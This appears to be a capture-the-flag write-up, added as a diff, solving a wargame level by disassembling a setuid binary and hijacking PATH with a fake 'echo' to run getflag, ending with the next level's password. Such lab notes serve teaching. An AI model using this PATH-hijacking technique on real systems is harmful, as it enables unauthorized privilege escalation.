@@ -1,0 +1,24 @@
+$>objdump -M intel -d level03
+
+(in <main>)
+80484f7:	c7 04 24 e0 85 04 08 	mov    DWORD PTR [esp],0x80485e0
+80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
+
+$>gdb
+(gdb)$>x/s 0x80485e0
+
+0x80485e0:	 "/usr/bin/env echo Exploit me"
+
+$>chmod 700 /home/user/level03
+$>setfacl -d -m u::rwx /home/user/level03
+
+create echo.c file
+
+$>gcc echo.c -o echo
+$>mv echo /tmp
+$>export PATH=/tmp
+$>./level03
+
+flag03$> /bin/getflag
+
+password lvl04 qi0maab88jeaj46qoumi7maus
